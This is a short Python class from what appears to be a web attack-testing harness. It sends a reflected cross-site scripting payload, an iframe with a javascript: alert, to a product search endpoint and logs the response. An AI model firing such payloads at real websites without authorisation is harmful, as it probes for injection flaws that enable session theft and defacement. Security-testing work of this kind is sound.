import time
from . import attack as a

class xss_search(a.attack_inter):
    def __init__(self, script=None):
        self.script = script
        self.url = a.URL + '/#/search'
        self.bashURL = a.URL+'/rest/products/search'
        

    def generator(self, myScript='<iframe src="javascript:alert(\'xss\')">'):
        
        
        params = '?q='+myScript  
        return self.url, params

    def run(self):
        a.logging.basicConfig(filename='./test_logging_info.log', 
                            level=a.logging.INFO, format='%(asctime)s %(message)s')
        a.logging.Formatter.converter = time.gmtime
        logger = a.logging.getLogger("XSS Search")
        a.logging.info(logger)
        a.logging.info('Started')

        if self.script:
            myURL,myparams = self.generator(self.script)
        else:
            myURL,myparams = self.generator()
        s = a.requests.Session()
        # myURL = myURL + myparams
        # response = s.post(myURL)


        response = a.requests.Request('GET', myURL)
        p = response.prepare()
        p.url += myparams
        resp = s.send(p, allow_redirects=False)

        print(resp.url)
        print(resp.status_code)
        a.logging.info('Finished')



